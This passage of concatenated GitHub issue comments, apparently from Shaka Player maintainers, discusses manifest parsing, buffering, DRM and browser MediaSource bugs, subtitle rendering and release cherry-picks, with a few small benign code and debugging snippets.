updated based on the update period in the manifest.  Headers have no influence over that.\nIf the server sends headers stating that the manifest should be cached, then the browser will cache them and will serve us the cached response.  We have no way to know if responses are served from cache or not.\n@mlondon1, does this answer your question?. I see no reason we couldn't add an informative event for this.  Adding to v2.3, with the caveat that it will skip to v2.4 if we don't have time.. Yes, absolutely.  DrmEngine is not directly accessible to apps through our exported API, so there's no compatibility concerns there.  A Player interface object makes sense.. I'm not sure I like the event name \"keysessionupdate\", though.  It doesn't match current EME terminology, as we don't call them \"key sessions\".\nHow about \"licenseupdate\", \"drmsessionupdate\", or \"drmupdate\"?. Yeah, I have the Safari 11 issues fixed locally with a new polyfill, but I am still in the process of writing a bug report to Apple about the remove failure.. New MediaSource bug filed against Safari 11: https://bugs.webkit.org/show_bug.cgi?id=177884. Cherry-picked to v2.2.3.. Not directly.  We don't have an API for that, but you can get it indirectly by shimming the manifest parser to examine the parsed segment references.  You could also use a network response filter to intercept the unparsed manifest and get the info you need from that.. #1043 may also help, if the info you need can be had from the Track APIs in the player.\nDoes this help answer your question?. From the manifest (shakaExtern.Manifest), you can find the individual streams (shakaExtern.Stream), which have methods for finding segment references.. We don't have an API for that, as far as I can recall.\nIf we did expose currently-playing segment, it would have to be based on a lookup of currentTime in the segment index of the Stream, which would be complicated.  We track what we're currently streaming, but what is being played from the buffer could be different.  We may have been streaming video Stream A, then B, then A again, and now C.  We don't track enough information to know which was put into what part of the buffered timeline.  And that example doesn't even involve clearing the buffer, seeking, or segment overlap.\nEven if we did have the data, we would have to expose to you as many as three segment references for the current time: video, audio, text.\nBecause of the way streaming and buffering works, and because of the architecture of what we already built, it would be difficult to track what segments are in buffer in what positions.  What might be easier would be to track what segments we have streamed and notify you as we stream them, but that could be done through server-side logging as well.. We are adding a method to the player to retrieve the parsed manifest. That should at least make it easier to access the manifest without needing to shim the parser.. @mad-gooze, we added a method called getManifest() to get the internal manifest structure from the player.  Does this help?. Glad we could help!  I'll go ahead and close this issue, but if you need any further assistance, please let us know.. Fixed in d85abe86da7e6e6efbec488b60c64289a6835113. The new tutorial has been cherry-picked to v2.2.4.. Shaka Player does not support MPD anchors, but we do have other solutions to that problem.  As @vaage pointed out, you can specify a start time when you call load().  For your case (starting a live stream at time zero), that seems like the best solution.\nFor more complex scenarios, you can configure a payable range.  See #246 for the discussion that led to that feature, and the playRangeStart and playRangeEnd fields of https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#PlayerConfiguration for the API.\nDoes that help answer your question?. We don't have any plans to support MPD anchors at this time.  We believe that specifying start times and play ranges is a more general solution that applies across manifest types.. Yes, you can use the Track APIs and look for the active track:\njs\nplayer.getVariantTracks().forEach(function(track) {\n  if (track.active) {\n    setInnerText(label, \"Auto (\" + track.width + \" x \" + track.height + \")\");\n  }\n});\nDoes this help?. That works, too.  getStats() should return the width & height of the active track.\nLet us know if you need anything else!. This is a duplicate of #982.  See https://github.com/google/shaka-player/issues/982#issuecomment-327233452 for a discussion of why this happens and what we propose to do to fix it.\nClosing as a duplicate.  Please subscribe to #982 for updates.  Thanks!. No problem!  It's difficult to tell sometimes, even for us.  :-). That should all be available from shakaExtern.Track.  Let us know if there's anything missing!. New method cherry-picked for v2.2.5.. Please use our issue template.  We need much more information in order to reproduce your issue and help solve it.\nAlso, please note that we can't reproduce playback issues with an attached manifest.  We need a URL with the content hosted somewhere so that we can play the content itself.\nHere's another copy of the template you deleted when you filed this issue:\n\nHave you read the FAQ and checked for duplicate issues:\nWhat version of Shaka Player are you using:\nCan you reproduce the issue with our latest release version:\nCan you reproduce the issue with the latest code from master:\nAre you using the demo app or your own custom app:\nIf custom app, can you reproduce the issue using our demo app:\nWhat browser and OS are you using:\nWhat are the manifest and license server URIs:\n(you can send the URIs to shaka-player-issues@google.com instead, but please use GitHub and the template for the rest)\nWhat did you do?\nWhat did you expect to happen?\nWhat actually happened?\n. We parse the region data, but regions are not supported by the browser, so you would have to write a custom TextDisplayer to render your own cues.\nFor reference:\n  - TextDisplayer interface docs: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.TextDisplayer.html\n  - Default TextDisplayer implementation which delegates to the browser: https://github.com/google/shaka-player/blob/master/lib/text/simple_text_displayer.js\nWe apologize for the inconvenience.. Good catch!  I'm sorry we made that mistake.  We will update the docs and get the fix out in v2.2.3.. Cherry-picked to v2.2.3.. We have not been tagging this issue in commits so far.  I believe these are the relevant commits to date:\n\n07e81f7bc9af49f665f9551f2a5eea2e2b3a9ca9\n9e043882925fd8b3683b558daa6d37388a2dd113\nddf8cb838e0344a733ea9bde14c0d56a2a527ba9\nd6f6927de3c15062d02a6968204b716224992524\n3cd9b6af3e386e9be12b537291aff2f589ac3fce\nee006d45238ddf5f924076528c09a433b4d581a1\nd90821a1a5830cdf09caa9707a99c945979ffd0e\nb68623180c9146b8f778d216529b02fed10fd296\nb98ce99f08e6f22d41eb5e87cea051f7a515d65f\n0e43b62f04fd4093fe304746e46530582ec93392\n2f47e6d7695bd22c939135e207f26f18e3dff76d\n540e533e69e5d16b8f21456a7da5f3d0afe8dcbd\n834d960f88d7f23b1ba107b108e90913f3c0b7e4\n6a03ceb30febf3462bcbab386e783ee3f76ea5b9\n8f45f7939de02fed60a5018a3343560cb7256063\nb53f5a0816b2bbab4481928704ed277983e86b6f\ndff382b9a3eb792f52c5c85955350d5b04c0f2d4\n3399292d4991c9cbae5b6e2d1307b15313903f1b\ne7c5a3a8aae16c3e542efd498de9b12652b8e444\nb8e0f8028daf91e6536f60febc520a7565f8972e\n46685fbd15b4e777a4c06d3d3b87213125879c40\n. Safari 11.0.0 (Mac OS X 10.11.6) MediaSourceEngine removes segments FAILED\n    Expected 15 to be close to 10.\n    test/media/media_source_engine_integration.js:142:57\n    promiseReactionJob@[native code]\n    Expected 15 to be close to 20.\n    test/media/media_source_engine_integration.js:143:58\n    promiseReactionJob@[native code]\n    Expected 25 to be 20.\n    test/media/media_source_engine_integration.js:146:50\n    promiseReactionJob@[native code]\n    Expected 5 to be close to 10.\n    test/media/media_source_engine_integration.js:147:58\n    promiseReactionJob@[native code]\nSafari 11.0.0 (Mac OS X 10.11.6) MediaSourceEngine trims content at appendWindowEnd FAILED\n    Expected 6.916666666666667 to be close to 10.\n    test/media/media_source_engine_integration.js:332:57\n    promiseReactionJob@[native code]\n    Expected 6.916666666666667 to be close to 18, 1.\n    test/media/media_source_engine_integration.js:335:57\n    promiseReactionJob@[native code]\nSafari 11.0.0 (Mac OS X 10.11.6): Executed 51 of 1287 (2 FAILED) (skipped 1236) (2.357 secs / 1.862 secs). The failure of the \"trims content at appendWindowEnd\" test is caused by a bug we've been working around in Safari 10: https://bugs.webkit.org/show_bug.cgi?id=165342\n\nWe can apply the same polyfill to Safari 11.. New MediaSource bug filed against Safari 11: https://bugs.webkit.org/show_bug.cgi?id=177884. Cherry-picked to v2.2.3.. Thanks, Chris!. Cherry-picked to v2.2.3.. No, you can't use Shaka Player or Widevine to obtain a unique identifier for the user.  This goes against privacy principles on the web.\nWhile DRM systems may create persistent identifiers if configured to do so (persistentStateRequired in advanced DRM config in Shaka):\n * some platforms show a prompt for user consent first\n * those identifiers are not available to JavaScript in any way\n * those identifiers may be cleared by the user at any time through the \"media licenses\" checkbox in \"Clear browsing data\"\nThese restrictions are designed to avoid creating new ways to track users without their knowledge or consent.  Shaka Player cannot and will not provide means of circumventing these basic privacy protections.. Shaka Player, for simplicity, does not have a way to abandon in-flight requests when switching resolutions.  Our bandwidth estimate is also based on the time to download full segments, so AbrManager may not recognize the need to switch until after a request has completed very slowly.\nTo improve that, we would need to:\n * build bandwidth estimate based on progress events during transfer\n   * but we'd have to be careful about how this affects #829 for switching from XHR to Fetch API\n * abort requests when switching to a lower bitrate stream\n   * but we'd have to be careful about the conditions for aborting a request.  We could perhaps estimate the time needed to complete the request and factoring that into the decision.  Aborting at 99% complete, for example, may hurt buffering overall.\nAs a side note, presentation delay has no bearing on the buffering goal.  In your scenario, you would buffer ahead a minimum of 10 seconds.  If the number falls to 9.9999..., we would fetch another segment.  Given the 10-second segment size, at any given time, you may have up to 20 seconds buffered.. Renamed and scheduled for v2.4 as an enhancement.  Thanks for filing!. No, I mean if the amount of media buffered ahead of video.currentTime is less than 10, we fetch another segment.\nThe effect of presentation delay is to say that \"this amount of content exists on the server, but don't show it to the user yet.\"  So a delay of 20 means there are 20 seconds of content past the user-visible \"live edge\" that could be buffered ahead of time.  This is why you can't buffer more than 30 seconds ahead, no matter how large your buffering goal is.  Content beyond that in the live stream isn't available to the client yet.. Correct.  In a live stream, you can't buffer ahead at the edge more than 1 segment + presentation delay, because nothing else is available.\nI'd have to analyze your content to see why you are getting 30 seconds.  If that is concerning, please open a separate issue for that.  I'd like to leave this one focused on the enhancement in https://github.com/google/shaka-player/issues/1051#issuecomment-334221660 about aborting requests when switching resolutions.  Thanks!. Things to do:\n  - Get progress events from XHR in NetworkingEngine plugin\n  - Get progress events from Fetch in NetworkingEngine plugin\n    - If there's no progress events in Fetch yet, we need to stop preferring it to XHR and file a spec bug\n  - StreamingEngine needs to abort segment requests in progress if the video bandwidth is downgraded\n    - We might need some policy to decide when to abort.  For example, if we're 99% done with a request when we downgrade, better to finish downloading that segment.  The best behavior would be to have an ETA for each request, and compare that to bufferedAhead to decide whether or not to abort.. First part of the implementation landed.  Quoting @TheModMaker from an internal review, we still need to add tests to verify that:\n\nXHR (and eventually fetch) plugins raise progress events\nCalling the callback from the plugin calls the function that is given to NetworkingEngine constructor\nCalling the progress handler for non-SEGMENT requests does nothing\nNetworkingEngine will call the progress handler if it doesn't get any calls from the plugin. Although live streams should ideally have an infinite duration in MediaSource and HTML5 video, that doesn't work across browsers.  We are glad Chrome has implemented seekable range for live streams, but everywhere else, an infinite duration precludes seeking.\n\nQuoted from the chromestatus.com page you linked:\n\nConsensus & Standardization\n- Firefox: In development\n- Edge: Public support\n- Safari: No public signals\n\nThe best we can do across browsers is to set duration to a large, finite value.  Here's what we currently do in StreamingEngine:\njs\nshaka.media.StreamingEngine.prototype.setDuration_ = function() {\n  var duration = this.manifest_.presentationTimeline.getDuration();\n  if (duration < Infinity) {\n    this.playerInterface_.mediaSourceEngine.setDuration(duration);\n  } else {\n    // Not all platforms support infinite durations, so set a finite duration\n    // so we can append segments and so the user agent can seek.\n    this.playerInterface_.mediaSourceEngine.setDuration(Math.pow(2, 32));\n  }\n};\nIn the mean time, to determine if a stream is live without examining duration, we provide the isLive() method on Player, which returns true if the currently-loaded content is live.. Please link to the chrome bug here so that we can follow along.  Thanks!. Thanks!. No longer occurs with the current stable version of Chrome.. We never buffer more than bufferingGoal + 1 segment.  For 10s segments and 20s bufferingGoal, that could be up to 30s.\nWe can't reach bufferingGoal if the content is not available.  Video's currentTime, mpd's timeShiftBufferDepth, and mpd's suggestedPresentationDelay all affect what is available.  If you are less than N seconds from the end of what is available from the server, you can't buffer N seconds of content.\nThe timeShiftBufferDepth and suggestedPresentationDelay attributes don't affect buffering goals, but do dictate what is available to buffer.\nWhat is your player configuration?  The default bufferingGoal is 30s, if I recall correctly.. Once we have your configuration, we will attempt to reproduce and explain what is happening.. I can't spot the difference between the two xml snippets in your description of the problem.  Are they identical?  Can you help us understand what we're supposed to see from those?\nAlso, it would be really helpful if you could provide a way for us to reproduce your issue.  A manifest URI is generally needed to reproduce issues that depends on a specific piece of content or type of content.. So it seems that the issue is in how we handle the conversion from dynamic, live streams to static, VOD streams.  We will look into it, but a way to reproduce this would be very helpful.. The availability window change has been cherry-picked to v2.2.4.. I moved this to the backlog because we ran way over time for v2.4, and it didn't fit into our planning for v2.5 and v2.6.  We will reconsider this when we start making plans for v2.7.  Sorry for any inconvenience!. DASH is implemented by Shaka Player, not the platform, so there shouldn't be any issue with platform support.  If isBrowserSupported returns true, and you are still unable to play DASH content, please file a bug with us to investigate further.\nDoes that answer your question?. @Lewis945, I'm going to close this issue based on the analysis provided by @vaage.  If you need any further assistance with this, please let us know, and we can reopen it.. I must be unfamiliar with this situation.  Please forgive my ignorance.\n@karlovich, you have 2s segments, and each 2s of subs is 32kB?  That would be about 128 kbit/sec, which is as much bandwidth as some audio streams.  I did not anticipate this.  Your TTML contains base64-encoded images instead of actual text?\n@kuznetcoff777, you have a minimum caption file size of 32kB?  Why is this a minimum?  Where does this limitation come from?\nI am not sure how much work it will be to change this.  A configurable parameter would not make it any easier to implement, so I'm not sure if that would make sense for us to add one.\nWe don't want anyone to waste 11 MB per person per hour on unused subs, so I will schedule this enhancement for the current milestone.  Thank you for being patient with us while we try to understand the problem better.. We are going to try to tackle this as part of v2.3.  Depending on how complex it turns out to be, it may have to be deferred until v2.4.. This will appear in v2.3, and is available in the nightly build now: https://nightly-dot-shaka-player-demo.appspot.com/demo/. We have been looking into the issue, but forgot to reopen the ticket.  We should have it fixed soon.  Thanks!. This should be fixed in the nightly build now: https://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//storage.googleapis.com/shaka-demo-assets/sintel-mp4-wvtt/dash.mpd;lang=ru\nAll fixes for this will appear in the v2.3 release.. I think the intended way for you to render them yourself is to use the TextDisplayer plugin interface.  See also the default implementation, SimpleTextDisplayer, which delegates to the browser's native rendering.\nI'm not sure of the details of what you are doing, but you may also be interested in bug #1332.  In that isue, we realized that in order to support native controls, we need a new option to stream without regard for the display state.  This may also help you.. Cherry-picked for v2.2.3.. Cherry-picked to v2.3.1.. Cherry-picked for v2.2.10.. @johnBartos, are you saying you can still reproduce this issue on IE and Edge?  What version of Shaka Player are you using?. @theodab, thanks for looking into this.  Can you please file a bug on core-js?  https://github.com/zloirock/core-js/issues/new\nIn that bug, please mention google/shaka-player#1062 to link back here for context, and mention @bengeorge and myself.  Thanks!. Good find.  Thanks!  @bengeorge, does this help?. Hi No\u00e9,\nWithout at least an error code, error message, or screenshot, there is nothing we can do to diagnose the issue.  Can you please provide one of these things?\nSince we don't have these specific devices to reproduce the problem, we need some more detailed information from you.  Until then, there is nothing we can do.\nThanks,\nJoey. Hi No\u00e9,\nI'm closing this issue for inactivity.  If you would like help with this, please provide the information I requested in my earlier comment, and we can reopen the issue.  Thanks!. The receiver is up-to-date with the latest release, but we are preparing another one.  If the receiver for v2.2.3 is not fixed, then the fix was something that has not yet been cherry-picked from master to v2.2.x.. This is fixed in v2.2.x, presumably by 4670d6ccab03d15e6ad1565bd4186db7bf36c7c2.. Looks like this was a Chromecast firmware bug which has since been fixed.  Current firmwares do not exhibit this problem.. The error-handling change has been cherry-picked to v2.2.4.. Looks like a decode failure.  What content is this?. I've renamed the issue to reflect that, and tagged it back to \"needs triage\" until we have determined what the bug is and whether or not it should be filed against Chromecast.. Closing due to inactivity.  We can reopen if we see it again.. @samaduttan, this issue is about WebM decode, and your content is MP4.  So what you are experiencing is unrelated to this issue.  In future, please file a new issue, and use the issue template to provide all the information we need to look into your report.\nA decode error like the one in your screenshot means that the platform (Chromecast hardware decoder in this case) was unable decode the content.  Please double-check that your content is correctly encoded.  If it is, please file a bug on Chromecast about this.  If you need help filing a bug on Chromecast, we can help you (in a new issue).\nThanks!. @kuznetcoff777, have we answered your question?  Is there anything else you need from us on this?. Ideally, we would be able to use network changes to \"forget\" history we've built up in the bandwidth estimator, but that could also be tricky.  Since our default estimator reacts quickly to drops in bandwidth (we take the min of fast and slow moving averages) we should still be able to recover from network changes without this.\nWe'll keep it on the backlog for now, until we can experiment a bit with it and determine what value there would be in using this information to enhance our estimate.. Closing due to inactivity.  Let us know if you need anything else.. Cherry-picked to v2.2.3.. A follow-up fix (fix of the fix) has been cherry-picked to v2.2.4.. It could be that we're lacking key statuses on PlayReady on Chromecast.  Just a guess.. I am unable to reproduce a 4012 error with the latest code, but I can reproduce the original problem description (empty track list on the sender side).\nIt appears that there is some timing issue with the cast proxy.  If I tell the demo to reload the track list from the proxy by executing shakaDemo.onTracksChanged_(), everything works.  So the event that is tied to that is either not being sent or is being sent at the wrong time.. Now I am seeing error 4012.  The order of things seems to be:\n\nA 'trackschanged' event from the receiver\nA track list from the receiver with 10 tracks\nAn error event from the receiver with error 4012\nAn updated track list which is empty\nAnother 'trackschanged' event from the receiver\n\nSo the events and proxying seem to be correct.  This may, in fact, be an issue with key statuses.. There is a key status event from the PlayReady CDM on Chromecast, but no actual key statuses.\nWe should be able to fix it.. The fix has been cherry-picked for v2.2.9.. @avelad, we are working on this issue, but it seems that your test stream does not exhibit the issue.  There are no AdaptationSet IDs and no urn:mpeg:dash:adaptation-set-switching:2016 descriptors.  We can test and verify with unit tests, but it would be nice to have a test stream from you as well so that we could have more confidence in our fix.. In that example, there are no observable differences.  What we do today is combine all compatible AdaptationSets.  The adaptation-set-switching descriptors in that piece of content say that all AdaptationSets should be combined, so it's not possible to see the bug at work with that content.\nHow is this bug impacting your application?  Do you have more selective adaptation-set-switching descriptors in your case?. @avelad, we are having difficulty understanding the negative impact of implied switching between all AdaptationSets.  Can you share with us a use-case or some sample content where this strategy fails or causes problems for your application?. We are discussing the best way to address this.  It seems that if the issue is that we're adapting between audio streams with different numbers of channels, we should consider which is simpler: forbidding adaptation between different numbers of channels, or completely implementing adaptation-set-switching.. Would you expect users to be able to manually switch between 2 channels and 6?. Thanks for the the feedback.  We'll work on a solution.. I believe that our solution to #1013 will address the immediate need (audio channels), but that this issue is still separate and more general.  I will therefore defer detailed implementation of AdaptationSet switching until v2.5.  Please let me know if you have any concerns with this.. @matenadasdi, did this answer your question?. Do you mean sample content with EMSG?  Or the JS code that implements EMSG support in Shaka Player?. @matenadasdi, does that answer your question?. @gleb-shchavlev, please check your CORS setup.  Are you working around CORS in Chrome with something like --disable-web-security?. Okay, thanks.  Moved back to the triage list.. @gleb-shchavlev, I don't think that's what @cpearce meant.  Can you try on the nightly version of Firefox?\nhttps://www.mozilla.org/en-US/firefox/nightly/all/. @gleb-shchavlev, is this still an issue for you in Firefox?  If so, can you provide an updated manifest and license URL we can use to re-test?. Thanks for the update!. We are adding a method to the player to retrieve the parsed manifest.  That should simplify things for you.. New method cherry-picked for v2.2.5.. No, you can use player.getManifest() to get access to our internal data structure for the parsed manifest.  The findSegmentPosition() and getSegmentReference() methods are on Stream, which is inside that manifest structure.  The hierarchy is manifest > period > variant > stream (audio/video).  Here are the docs for the manifest structure: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.html#Manifest. I'm sorry that the API for this isn't more obvious, but in some cases (DASH, SegmentTemplate+duration, live content), there is no fixed list of segments at all.\n@bennypowers, @odedhutzler, can you tell us why you need a list of segments?  If we understood the motivation, it might help us prioritize this idea and build a better API for you.. You should be able to do this with async response filters.  You can examine the response, make an additional request if appropriate, then replace the original response body with the second response.\nWould this help?. Honestly, drm.licenseRequestHandlers seems like a lot of effort, and I don't completely understand why it is better for you to make the request yourself.  However, if you want to do it, I think a scheme plugin might be best.\nImagine that your license URI was \"drm:playready\" or \"drm:widevine\", and you register a plugin for the \"drm\" scheme.  You can handle the whole thing there, using your own net stack, etc.\nIs that helpful?. Okay, that sounds good.  #1296 looks good to me.  Thanks!. Will do.  Thanks!. According to Microsoft, 8004b896 is a playready error:\nhttps://msdn.microsoft.com/en-us/library/dn468822.aspx\n\nMSPR_E_NO_DECRYPTOR_AVAILABLE Failure occurred when attempting to find a correct PlayReady decryptor object - no decryptor was found. 0x8004B896\n\nIs it a race between playback and licensing?  Does it take 200ms to get an encrypted segment?\nWhat happens if you don't autoplay the video and leave it paused until after the license is complete?. Whether or not there are unencrypted segments, I'm speculating about whether this is a race between one part of the media stack in Edge and another.\nTry this, if you would:\n\nEdit lib/media/media_source_engine.js\nIn shaka.media.MediaSourceEngine.prototype.append_, add a log statement like console.log('append media segment', contentType).\nIn shaka.media.MediaSourceEngine.prototype.onUpdateEnd_, add another log statement like console.log('update complete', contentType)\nEdit lib/media/drm_engine.js\nIn shaka.media.DrmEngine.prototype.sendLicenseRequest_, right before session.update, add a log statement like console.log('license response received')\nOn the next line, where we create the 'drmsessionupdate' event, add another log statement like console.log('license response processed')\n\nThis should give us an idea of the timing of these things.  I suspect, based on what you've told us, that we will see success if the license is processed before we append media, and that we will see failure if the media is appended first.  If this is the case, then we have a bug in Edge and we can report it to Microsoft.. So to clarify, you see this issue:\n\non real hardware running Windows 10, not just on a VM\nwith the Axinom test assets in our demo, not just with your own content\n\nIs that correct?. Got it.  Thanks for the info.  We will look into this.\nWe recently updated our lab to Edge 16, so if we have difficulty reproducing, we may have to assume that this is something Microsoft already fixed.. Sorry for the delay.  We have been busy on some HLS issues lately.  We will be looking into this issue over the next few days.. Instead of MS error code 8004b896, I get error code 80070241.  I also get a failure no matter the timing.. I can't reproduce exactly your results.  I am unable to play any Axinom PlayReady content regardless of license timing, but I can play a PlayReady stream from Unified Streaming every time.\n@TheJohnBowers, can you play this?\nhttps://nightly-dot-shaka-player-demo.appspot.com/demo/#asset=//demo.unified-streaming.com/video/tears-of-steel/tears-of-steel-dash-playready.ism/.mpd;lang=en-US. Someone from Microsoft has just informed me that the error code I'm getting (80070241) seems to refer to a DLL or driver signing error.  Not sure how we could run into that.. Someone from Microsoft recommended checking code integrity logs to diagnose 80070241, and we found this:\n\nCode Integrity is unable to verify the image integrity of the file (path involving Microsoft.HEVCVideoExtension) because the set of per-page image hashes could not be found on the system.\n\nThe command we ran was:\nsh\nwevtutil qe Microsoft-Windows-CodeIntegrity/Operational  /f:Text\nWaiting on further guidance from MS.. Using the content from @TheJohnBowers in an earlier comment, I am able to get around the apparent code integrity error 80070241.  However, I am still unable to reproduce the issue with failures related to license delay.\nThe server is returning a license in less than 100ms every time.  To artificially delay the request, I'm using a network request filter:\njs\nnetworkingEngine.registerRequestFilter(function(type, request) {\n  if (type != shaka.net.NetworkingEngine.RequestType.LICENSE) return;\n  var p = new shaka.util.PublicPromise();\n  setTimeout(function() {\n    console.log('RESOLVING');\n    p.resolve();\n  }, 3000);\n  console.log('WAITING', p);\n  return p;\n});\nIt makes no difference if I delay 300ms or 3s.  Either I am unable to reproduce the original issue at all, or this type of artificial delay is ineffective at triggering the issue.. I am also unable to reproduce using a response filter for delay.\nIs there a way to simulate slow networks on Edge?  I know there is such a thing in Chrome's dev tools, but I couldn't find an equivalent in Edge.. Note: the filters I am inserting are being put right after networkingEnging.clearAllResponseFilters() in demo/common/demo_utils.js, to make sure they catch the first license requests.. Using the content from @TheJohnBowers and a very slow WiFi network, license requests are taking consistently more than 750ms, and I am unable to reproduce any failure.  (Even though the 5Mbit/s HD-only content takes about 2-3 minutes to buffer and start playback on this 250kbit/s network.)\nSo, ignoring the strange integrity check errors from the Axinom content (which may be unrelated) and using the content that fails for @TheJohnBowers, I am unable to reproduce in Edge 16.  For now, please try again in an updated version of Edge, as this delay-related issue may have been fixed already.. @TheJohnBowers, it certainly wasn't wasted time.  I learned a lot about certain Windows errors and had a good conversation with a very kind and helpful person at Microsoft.\nMore demo content sounds good.  Thanks!. Update: the content from Apple linked above does not allow cross-origin access, so we can't add that to our demo.. TS assets have been added to the demo, the service worker will cache mux.js, and the next nightly build will include mux.js.. @osmestad, yes, this is a bug in the demo, #1214.. We are listening to the correct event for this, and the issue only seems to affect Android.\nI'm going to assume this is a Chrome bug on Android for now, and try to file a bug upstream.. This is not an external bug at all.  We should be using the \"input\" event, not \"keyup\".  We will not see the \"keyup\" event for pasted data on Android, but we will see the \"input\" event for both keystrokes and paste, on both desktop and mobile.. Fix cherry-picked to v2.3.7. Text display is currently handled by the browser or the application.  Browsers do not currently support regions, but we do parse them and make the information available to text display plugins.\nAdding this to the backlog.  We will consider a complete DOM-based implementation of TextDisplayer.. In the mean time, feel free to write your own plugin for this.  We would be happy to review a pull request if you decide to work on this.. It's not a TTML plugin, but rather a text display plugin.  It receivers cues which it is responsible for rendering.  Here's the interface documentation:\nhttps://shaka-player-demo.appspot.com/docs/api/shakaExtern.TextDisplayer.html\nHere's the documentation for the cue objects:\nhttps://shaka-player-demo.appspot.com/docs/api/shaka.text.Cue.html\nThis system is more general than TTML.  It will be used by the player for all subtitle/caption rendering, regardless of the input format.\nYou can pass whatever state you want into the constructor or into additional methods you have on your class.. The shaka.text.Cue class is owned by us, and is independent of the browser.  If it is missing some TTML feature you need, we can extend it.  We intend it to be generic enough to support both TTML and WebVTT.\nThe exact Cue object (as output by the TTML parser) will be sent to the TextDisplayer plugin.  If there is something missing in that object, we would be happy to take either a feature request or pull request to add fields to Cue and add parser support for them in the TTML parser.. First, let me address using imscJS for TTML support:\nOur current TTML parser, limited though it may be, compiles to about 7,939 bytes.  imscJS + its sax dependency is 159,787 bytes.  That's a 20x increase in size for the TTML parser itself.  Shaka Player as a whole is currently 185,141 bytes (in my working directory, anyway), so adding imscJS + sax would be an 86% increase in the size of Shaka Player itself.\nThat is way too big for a built-in subtitle parser.  If you want to use imscJS to handle TTML, you can always have a text-parsing plugin at the application level which replaces our default TTML parser.  See the API docs on TextParser if you want to pursue that: https://shaka-player-demo.appspot.com/docs/api/shakaExtern.TextParser.html\nAs for enriching our existing TTML parser, I'm completely open to that.  But since it sounds like our Cue interface is not up to the task of full TTML support, it will need to be redesigned.  If you want to contribute in this area, I would prefer to get a design proposal for Cue and iterate on that before you make a complete pull request.  If you don't want to do this, my team will look into it once we have taken care of some higher-priority features.  For now, this is still in the \"backlog\" milestone for us.\nThanks!. Thanks for migrating this into public, where it might help others dealing with similar issues.  I'm going to leave this open for the moment until we hear back from Flussonic.. Great, thanks for the update!. Recognizing raw AAC is easy, but given the new timestamp parsing code we are using to fix #1011, we still won't be able to fully support raw AAC until we have a parser for it.. @media-square, no update.  We have not worked on this at all yet.\nRe: the patch suggested by @avelad, no, that would not work for live streams as far as I can tell.. Yes, that's the idea.. As far as I can tell, containerless formats like MP3 and raw AAC do not have their own timestamps.  So long as the video and audio content are properly aligned and the content is VOD, we could just use the patch from @avelad.  But I don't think there are any timestamps to parse out, so we're left with guessing at \"0\".\nI'm not certain what will happen with that patch and any non-zero-start-time content or any live content, though.  What happens for raw AAC in live depends on how MediaSource behaves with timestamp-less raw content.  I'm reaching out to the Chrome team for clarification, but I suspect this will not work yet for live.. I heard from Chrome team.  The way AAC and MP3 work in MediaSource is that timestampOffset determines the starting time of each new append in the SourceBuffer, and after each append, the browser updates timestampOffset to reflect the amount of data that was appended.  This is 'sequence' mode, even if you didn't set it explicitly on the SourceBuffer.\nIf we had the right metadata, we could make that work, including for live.  But it will require refactoring in our HLS implementation.  That refactor would overlap significantly with #1558.. Fixes to date cherry-picked for v2.2.6.. We have significantly improved cancellation time, and destroy should no longer block forever.  There are more optimizations coming with cancelable requests as part of #829.\nPlease let us know if you have any questions.  Thanks!. We were not aware of this issue, and we must have overlooked this in the spec.  I've tentatively scheduled for v2.4.\nTo help us plan the work and understand the issue better, can you please provide sample content which is currently failing due to this issue?  If you can't post a URL publicly, please email to shaka-player-issues@google.com instead.\nThanks!. Ah, I see now.  So without the URI attribute in the EXT-X-MEDIA audio tag, the audio is muxed in with the video.  Is that correct?. The commit message in adde0bd38daca175df1c7feed8d46d5cde83aef0 is malformed, but this issue was fixed by that commit.. Fix cherry-picked for v2.4.6.. It may also be worth considering why you want a fallback from Shaka Player to setting the video src.  If the load() failure is caused by a lack of browser support, you should call shaka.Player.isBrowserSupported() ahead of time to avoid this scenario.  If the browser is not supported, you can go directly to video.src.\nFor a more detailed probe of what the browser does and does not support, you can use shaka.Player.probeSupport() to get a look at what media types, manifest types, and DRM systems will be usable on this particular browser.  Note, though, that this method may result in a user permission prompt (from EME) on certain platforms.\nYou can read more about these methods in the API docs here: https://shaka-player-demo.appspot.com/docs/api/shaka.Player.html. Thanks for the feedback, Peter.\nA few things worth noting here:\n\nWe set up MediaSource in advance, as @TheModMaker says, to speed up load() later.  This was based on feedback we got from one of your colleagues (Daniel Baulig) when we were designing v2.\nThis design decision is in conflict with three upcoming features:\n  a. #880, an API to preload content without a video tag\n  b. #997, HLS support on iOS through src=\n  c. #816, support of progressive, non-adaptive media through src=\n\nIn all likelihood, we will have to scrap advanced MediaSource setup at some point for those features.  Since we originally did it for the sake of your application, and since you don't seem to want it any more, it seems like it won't be missed if we remove it in v2.4.\nFor now, I'll mark this as an enhancement for v2.4, rename to reflect the removal of advanced MediaSource setup, and note that this is a prerequisite for the other three features mentioned above.. I'm sorry, maybe I misunderstood.\nSetting up MediaSource in advance of load() means setting it up in both the Player constructor and in unload().  You can't set up MediaSource without attaching it to the src attribute of a video element.\nSo we can't give you control of src= after unload and set up MediaSource in advance of load().\nWhat would make the most sense from your perspective?. Okay, then in that case, I'll try to make sure our design changes offer some way to explicitly setup MediaSource in advance, rather than implicitly, so that applications can take control of the flow.  How does that sound?. No problem.  Sorry for the misunderstanding.. Here's what I'm building at the moment:\n  - New method attach(video, initalizeMediaSource) to take ownership of a video element, where initalizeMediaSource decides if we set up MediaSource in advance or not, and defaults to true\n  - video argument in Player constructor becomes optional, and if provided, is equivalent to calling attach(video, true)\n  - New method detach() to release ownership of the media element\n  - New argument reinitializeMediaSource in unload(), decides if we should set up MediaSource in advance of a subsequent load() or not, and defaults to true\n  - attach() and detach() are unavailable while casting\n@peterdotjs, what do you think?  The default behavior will stay the same, but you will have options to explicitly decide when we take over a video element and when we set up MediaSource.. This feature will be out in v2.4 this week.. We do not support DASH manifests without any index info.  We do support SIDX parsing to get the index, but the manifest needs to at least indicate the byte range of the SIDX box (using SegmentBase indexRange=\"...\").\nIn my opinion, these so-called \"crippled\" DASH manifests are not reasonable from the perspective of a JavaScript application.  If your encoder vendor produces crippled DASH manifests, you should file a support request to ask them to fix their product.  I would be happy to assist you in that if you wish.. @aptly-io, we can definitely drop the constness of those properties if it's helpful.\nYou may want to look at these two recent changes we made for HLS which may be helpful:\n\"Make partial segment requests in HLS parser\": a93455a917e0c97fd4a57e8bb52d25659fc5ced8\nThis shows how you can request a partial segment for faster 